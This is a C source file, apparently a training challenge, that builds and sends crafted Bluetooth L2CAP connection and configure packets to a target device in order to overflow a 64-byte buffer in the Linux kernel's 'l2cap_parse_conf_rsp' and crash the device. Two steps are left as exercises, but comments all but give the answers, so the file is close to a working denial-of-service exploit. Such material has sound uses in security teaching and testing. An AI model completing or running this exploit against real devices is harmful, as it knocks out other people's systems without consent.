//copyright @
//huahuaisadog@gmail.com
//
//modifyed by
//axel.roudaut@outlook.com

/***
***Only for linux devices***
usage:
$ gcc -o dos challenge_dos.c -lbluetooth
$ sudo ./dos TARGET_ADDR
***/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>

#define __u8 unsigned char
#define __le16 unsigned short
#define __le32 unsigned int

struct l2cap_cmd_hdr {
	__u8       code;
	__u8       ident;
	__le16     len;
};
struct l2cap_conn_req {
	__le16     psm;
	__le16     scid;
};
struct l2cap_conf_req {
	__le16     dcid;
	__le16     flags;
	__u8       data[0];
};
struct l2cap_conf_rsp {
	__le16     scid;
	__le16     flags;
	__le16     result;
};
struct l2cap_conf_option {
	__u8	   type;
	__u8 	   len;
};
struct fake_option {
	__u8 	   type;
	__u8 	   len;
	__le16 	   val;
};
struct l2cap_conf_efs {
	__u8 	   id;
	__u8 	   stype;
	__le16 	   msdu;
	__le32 	   sdu_itime;
	__le32	   acc_lat;
	__le32 	   flush_to;
};



static void print_hex(char *str, int str_len)
{
        printf("0x");
        //while(*str) // pbm stop at null bytes
        int i = 0;
        while(i < str_len){
                printf("%02x", (unsigned int) *str++);
                i++;
        }
        printf("\n");
}

static void print_l2cap_cmd_hdr(struct l2cap_cmd_hdr p){
	printf("\tl2cap_cmd_hdr:\n");
	printf("\t\tcode = 0x%02x\n", p.code);
	printf("\t\tident = 0x%02x\n", p.ident);
	printf("\t\tlen = 0x%02x\n", p.len);
}
static void print_l2cap_conn_req(struct l2cap_conn_req p){
	printf("\tl2cap_conn_req:\n");
	printf("\t\tpsm = 0x%02x\n", p.psm);
	printf("\t\tscid = 0x%02x\n", p.scid);
}
static void print_l2cap_conf_req(struct l2cap_conf_req p){
	printf("\tl2cap_conf_req:\n");
	printf("\t\tdcid = 0x%02x\n", p.dcid);
	printf("\t\tflags = 0x%02x\n", p.flags);
	printf("\t\tdata = ");
       	print_hex(p.data, sizeof(p.data));
}
static void print_l2cap_conf_rsp(struct l2cap_conf_rsp p){
	printf("\tl2cap_conf_rsp:\n");
	printf("\t\tscid = 0x%02x\n", p.scid);
	printf("\t\tflags = 0x%02x\n", p.flags);
	printf("\t\tresults = 0x%02x\n", p.result);
}
static void print_l2cap_conf_option(struct l2cap_conf_option p){
	printf("\tl2cap_conf_option:\n");
	printf("\t\ttype = 0x%02x\n", p.type);
	printf("\t\tlen = V\n", p.len);
}
static void print_fack_option(struct fake_option p){
	printf("\tfack_option:\n");
	printf("\t\ttype = 0x%02x\n", p.type);
	printf("\t\tlen = 0x%02x\n", p.len);
	printf("\t\tval = 0x%02x\n", p.val);
}
static void print_l2cap_conf_efs(struct l2cap_conf_efs p){
	printf("\tl2cap_conf_efs:\n");
	printf("\t\tid = 0x%02x\n", p.id);
	printf("\t\tstype = 0x%02x\n", p.stype);
	printf("\t\tmsdu = 0x%02x\n", p.msdu);
	printf("\t\tsdu_itime = 0x%02x\n", p.sdu_itime);
	printf("\t\tacc_lat = 0x%02x\n", p.acc_lat);
	printf("\t\tflush_to = 0x%02x\n", p.flush_to);
}


#define HEAD_LEN (sizeof(struct l2cap_cmd_hdr))
static int parse_conn_req(void *buffer, __u8 ident, __le16 len, void *data) {
	printf("-- parse_conn_req --\n");
	struct l2cap_cmd_hdr head;
	head.code = L2CAP_CONN_REQ;
	head.ident = ident;
	head.len = len;
	memcpy(buffer, &head, sizeof(head));
	memcpy(buffer + sizeof(head), data, len);
	print_l2cap_cmd_hdr(head);
	return len + sizeof(head);
}

#define L2CAP_SERV_NOTRAFIC 0x00
static int parse_conf_req_efs_notrafic(void *buffer)
{
	printf("-- parse_conn_req_efs_notrafic --\n");
	struct l2cap_conf_efs efs;
	struct l2cap_conf_option opt;
	memset(&efs, 0, sizeof(efs));
	opt.type = L2CAP_CONF_EFS;
	opt.len = sizeof(efs);

	// ... 
	
	print_l2cap_conf_efs(efs);
	print_l2cap_conf_option(opt);
	memcpy(buffer, &opt, sizeof(opt));
	memcpy(buffer+sizeof(opt), &efs, sizeof(efs));
	return sizeof(opt)+sizeof(efs);
}

static int parse_conf_req(void *buffer, __u8 ident, __le16 len, void *data){
	printf("-- parse_conf_req --\n");
	struct l2cap_cmd_hdr head;
	struct l2cap_conf_req req;
	head.code = L2CAP_CONF_REQ;
	head.ident = ident;
	head.len = len + sizeof(req);
	req.dcid = 0x40;
	req.flags = 0;
	memcpy(buffer, &head, sizeof(head));
	memcpy(buffer + sizeof(head), &req, sizeof(req));
	memcpy(buffer + sizeof(head) + sizeof(req), data, len);
	print_l2cap_cmd_hdr(head);
	print_l2cap_conf_req(req);
	return len + sizeof(req) + sizeof(head);
}

static int parse_conf_rsp_result_pending(void *buffer, __u8 ident, __le16 len, void *data){
	printf("-- parse_conf_rsp_result_pending --\n");
	struct l2cap_conf_rsp rsp;
	struct l2cap_cmd_hdr head;
	head.code = L2CAP_CONF_RSP;
	head.ident = ident;
	head.len = len + sizeof(rsp);
	rsp.scid = 0x40;
	rsp.flags = 0;
	rsp.result  = L2CAP_CONF_PENDING;
	memcpy(buffer, &head, sizeof(head));
	memcpy(buffer + sizeof(head), &rsp, sizeof(rsp));
	memcpy(buffer + sizeof(head) + sizeof(rsp), data, len);
	print_l2cap_cmd_hdr(head);
	print_l2cap_conf_rsp(rsp);
	return len + sizeof(rsp) + sizeof(head);
}

int main(int argc ,char* argv[]){
	int sock_fd, ret;
	int i;
	void *l2cap_command_1, *l2cap_command_2, *l2cap_command_3, *req_data, *rsp_data;
	char dest[18];
	struct sockaddr_l2 local_l2_addr;
	struct sockaddr_l2 remote_l2_addr;
	__le16 psm_default = 0x1001;
	int retry_count = 0;

	if(argc != 2){
		printf("usage : sudo ./test TARGET_ADDR\n");
		return -1;
	}
	strncpy(dest, argv[1], 18);

	printf("\n/*----------------------------------------------------------------------------------------------*/\n");
	printf("[Part 1]\n\t- Create the socket for the Bluetooth connection\n");
	sock_fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
	if(sock_fd == -1){
		perror("[-]socket create failed : ");
		return -1;
	}

	printf("\t- Bind/Associate the socket with the local bluetooth address\n");
	memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
	local_l2_addr.l2_family = PF_BLUETOOTH;
	memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));
	ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
	if(ret == -1){
		perror("[-]bind()");
		goto out;
	}

	printf("\t- Connect the socket to the remote address\n");
	memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
	remote_l2_addr.l2_family = PF_BLUETOOTH;
	remote_l2_addr.l2_psm = htobs(psm_default); // Protocol Service Multiplexer - another L2CAP term meaning port number
	str2ba(dest, &remote_l2_addr.l2_bdaddr);
	while(retry_count < 5){
		if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {
			perror("[-]Can't connect");
			retry_count ++;
			remote_l2_addr.l2_psm = htobs(psm_default + retry_count);
			continue;
		} else
			break;
	}
	if(retry_count == 5)
		goto out;
	sleep(2);

	printf("\n/*----------------------------------------------------------------------------------------------*/\n");
	//send conn req
	printf("\n[Part 2] Send the L2CAP Connection Request\n");
	l2cap_command_1 = malloc(0x100); // buf
	struct l2cap_conn_req conn_req;
	conn_req.scid = 0x40; // Specific Channel ID - can be compared to the port used in TCP 
	conn_req.psm = 0x1; // Protocol Service Multiplexer - another L2CAP term meaning port number
	parse_conn_req(l2cap_command_1, 0x2, sizeof(conn_req), &conn_req);
	print_l2cap_conn_req(conn_req);
	ret = send(sock_fd, l2cap_command_1, HEAD_LEN + 0x4, 0); // Send the L2CAP packet with crafted command
	printf("ret = %i\n", ret); // ret is the returns the length of the message in bytes.
	printf("l2cap_command_1 = "); print_hex(l2cap_command_1, ret);
	sleep(2);

	printf("\n/*----------------------------------------------------------------------------------------------*/\n");
	//send req data
	printf("\n[Part 3] Send L2CAP Configure Request\n");
	l2cap_command_2 = malloc(0x100); // buf
	req_data = malloc(0x100);
	
	// QUESTION 1
	printf("QUESTION 1\nFind how access to the vulnerable function 'l2cap_parse_conf_rsp'\n");
	printf("To do so you must complete the function 'parse_conf_req_efs_notrafic' above\n");
	int data_len = parse_conf_req_efs_notrafic(req_data); // setting the stype field to L2CAP_SERV_NOTRAFIC in the EFS struct added in this configure request data

	int total_len = parse_conf_req(l2cap_command_2, 0x2, data_len, req_data); // add req_data to l2cap_command
	ret = send(sock_fd, l2cap_command_2, total_len, 0); // send L2CAP packet containing l2cap_command
	printf("ret = %i\n", ret); // ret is the returns the length of the message in bytes.
	printf("l2cap_command_2 = "); print_hex(l2cap_command_2, ret);
	sleep(1);
	
	printf("\n/*----------------------------------------------------------------------------------------------*/\n");
	//send rsp data
	printf("\n[Part 4] Send L2CAP Configure Response \n");
	l2cap_command_3 = malloc(0x100); // buf
	rsp_data = malloc(0x100);
	memset(rsp_data, 0, 0x80);
	
	struct fake_option fake;
	fake.type = L2CAP_CONF_MTU;
	fake.len = 2;
	fake.val = 0x41;

	// QUESTION 2
	printf("Find how overflow the buf[64] with valid L2CAP structure\n");
	int nbr = 0;	
	for(i = 0; i < nbr; i++){  // Add 40 (=0x28) times the fack_option to the response data
		memcpy(rsp_data + i*sizeof(fake), &fake, sizeof(fake));
	}
	// Here the buffer rsp_data contains 0x108 bytes of data with only 0x100 bytes allocated to him = overflow 
	total_len = parse_conf_rsp_result_pending(l2cap_command_3, 0x2, nbr*sizeof(fake), rsp_data); // Add rsp_data to l2cap_command_3
	print_fack_option(fake);
	printf("--> nbr*sizeof(fake)+1 = %i \t< 64 ??\n", nbr*sizeof(fake)+1);
	ret = send(sock_fd, l2cap_command_3, total_len, 0); // send L2CAP packet containing l2cap_command_3
	printf("ret = %i\n", ret); // ret is the returns the length of the message in bytes.
	printf("l2cap_command_3 = "); print_hex(l2cap_command_3, ret);
	sleep(3);
	printf("\n[+]test done\n");
	free(req_data);
	free(rsp_data);
	free(l2cap_command_1);
	free(l2cap_command_2);
	free(l2cap_command_3);

out:
	close(sock_fd);
	return 0; 
}
